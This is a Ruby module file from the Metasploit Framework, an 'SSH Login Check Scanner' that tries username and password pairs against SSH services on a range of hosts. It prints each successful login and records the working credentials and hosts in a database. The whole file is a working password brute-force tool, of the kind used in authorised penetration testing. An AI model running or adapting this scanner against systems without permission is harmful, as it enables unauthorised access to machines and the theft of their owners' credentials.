##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'SSH Login Check Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module will test ssh logins on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => ['todb'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptBool.new('VERBOSE', [ true, 'Verbose output', false]),
				Opt::RPORT(22)
			], self.class
		)

		deregister_options('RHOST')

	end

	def rport
		datastore['RPORT']
	end

	def run_host(ip)
		print_status("Starting host #{ip}")
		begin
			each_user_pass { |user, pass|
				print_status "#{ip}:#{rport} - SSH - Attempting: '#{user}':'#{pass}'" if datastore['VERBOSE']

				# Ought to be def'ed seperately, and include a timeout for the impatient.
				begin
				@ssh_sock = Net::SSH.start(
					ip,
					user,
					:password => pass,
					:auth_methods => ['password'],
					:port => rport
				)
				rescue Net::SSH::Exception # Myriad reasons why this can fail.
				end

				if @ssh_sock
					print_good "#{ip}:#{rport} - SSH - Success: '#{user}':'#{pass}'"
					@ssh_sock.close

					# Report
					report_service(
						:host => ip,
						:port => rport,
						:name => 'ssh'
					)

					report_auth_info(
						:host => ip,
						:port => rport,
						:proto => 'ssh',
						:user => user,
						:pass => pass
					)


					return :next_user
				end
			}
		rescue ::Errno
			return
		end
	end
	
end


